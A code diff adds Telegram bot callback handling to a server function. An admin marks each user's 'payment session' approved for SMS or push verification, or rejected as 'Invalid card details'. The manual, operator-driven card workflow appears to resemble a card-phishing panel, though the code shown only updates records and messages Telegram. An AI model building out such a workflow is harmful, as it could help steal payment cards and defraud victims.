@@ -57,7 +57,68 @@ serve(async (req) => {
       const callbackQuery = body.callback_query;
       console.log('Received callback query:', callbackQuery.data);
       
-      // You can add callback handling logic here
+      // Handle payment processing callbacks
+      if (callbackQuery.data && callbackQuery.data.startsWith('payment_')) {
+        const parts = callbackQuery.data.split('_');
+        if (parts.length >= 3) {
+          const userId = parts[1];
+          const action = parts[2]; // sms, push, or error
+          
+          console.log(`Processing payment ${userId} with action ${action}`);
+          
+          // Update payment session status
+          let paymentStatus = 'pending';
+          let adminResponse = action;
+          
+          if (action === 'sms' || action === 'push') {
+            paymentStatus = 'approved';
+          } else if (action === 'error') {
+            paymentStatus = 'rejected';
+          }
+          
+          const { error: updateError } = await supabaseClient
+            .from('payment_sessions')
+            .update({
+              payment_status: paymentStatus,
+              admin_response: adminResponse
+            })
+            .eq('user_id', userId);
+          
+          if (updateError) {
+            console.error('Error updating payment session:', updateError);
+          } else {
+            console.log(`Payment session ${userId} updated to ${paymentStatus} with ${adminResponse}`);
+          }
+          
+          // Send confirmation message back to admin
+          const confirmationMessages = {
+            sms: '✅ Payment approved for SMS verification',
+            push: '✅ Payment approved for Push notification', 
+            error: '❌ Payment rejected - Invalid card details'
+          };
+          
+          await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/answerCallbackQuery`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              callback_query_id: callbackQuery.id,
+              text: confirmationMessages[action as keyof typeof confirmationMessages] || 'Action processed'
+            })
+          });
+          
+          // Edit the original message to show it's been processed
+          await fetch(`https://api.telegram.org/bot${telegramSettings.bot_token}/editMessageText`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: callbackQuery.message.chat.id,
+              message_id: callbackQuery.message.message_id,
+              text: callbackQuery.message.text + `\n\n✅ *Processed:* ${confirmationMessages[action as keyof typeof confirmationMessages]}`,
+              parse_mode: 'Markdown'
+            })
+          });
+        }
+      }
     }
 
     return new Response('OK', { headers: corsHeaders });
